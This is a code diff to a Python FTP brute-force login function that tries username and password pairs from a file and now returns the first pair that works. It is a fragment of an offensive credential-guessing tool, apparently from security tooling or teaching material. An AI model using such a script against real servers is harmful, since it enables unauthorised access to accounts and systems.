@@ -16,6 +16,7 @@ def bruteLogin(hostname, passwdFile):
             login = ftp.login(userName, passWord)
             print("[+] Login Suceeded With: " + userName + "/" + passWord)
             ftp.quit()
+            return(userName,passWord)
         except:
             pass
     print("[-] Password Not In List")        
